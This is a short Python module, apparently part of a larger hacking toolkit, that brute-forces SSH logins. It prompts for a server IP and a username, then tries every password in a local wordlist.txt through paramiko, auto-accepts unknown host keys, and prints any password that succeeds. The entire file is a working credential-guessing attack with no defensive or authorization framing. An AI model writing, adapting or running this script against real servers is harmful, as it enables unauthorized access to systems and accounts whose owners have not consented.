import paramiko
from utils.colors import color_text

def run():
    print(color_text("\n[+] Starting SSH Brute Force...\n", "cyan"))
    
    host = input("Enter SSH server IP address: ")
    username = input("Enter username to test: ")

    try:
        with open("wordlist.txt", "r") as f:
            for line in f:
                password = line.strip()
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, username=username, password=password, timeout=5)
                    print(color_text(f"[SUCCESS] Password found: {password}", "green"))
                    ssh.close()
                    return
                except paramiko.AuthenticationException:
                    print(color_text(f"[-] Failed login: {password}", "red"))
                except Exception as e:
                    print(color_text(f"[!] Error: {e}", "red"))
                    break
    except FileNotFoundError:
        print(color_text("[-] wordlist.txt not found!", "red"))
